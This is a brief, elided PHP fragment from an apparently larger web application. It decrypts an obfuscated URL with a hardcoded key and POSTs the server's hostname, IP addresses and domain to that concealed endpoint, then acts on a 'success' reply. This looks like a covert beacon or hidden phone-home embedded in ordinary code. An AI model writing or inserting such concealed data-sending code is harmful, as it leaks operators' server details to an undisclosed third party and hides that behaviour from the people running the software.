        ...
        if($asws){
            try {
                ...
                if($fk !== false) {
                    ...
                    $rs=\Httpful\Request::post(Crypt::decrypt('gqmjsH17cqyGe6KrgXzMksZ9eauwommsjHiJaX2ewM2PvNqkio9_p4Wkr6mAZ6nWu42NYcJ6bnM','WriteHtml'))->body(['hostname'=>gethostname(),'host_ip'=>gethostbyname(gethostname()),'server_ip'=>$vsip,'domain'=>$ht])->sendsForm()->send();
                    $jg=$rs->body->message ?? '';
                    if($jg === 'success') {
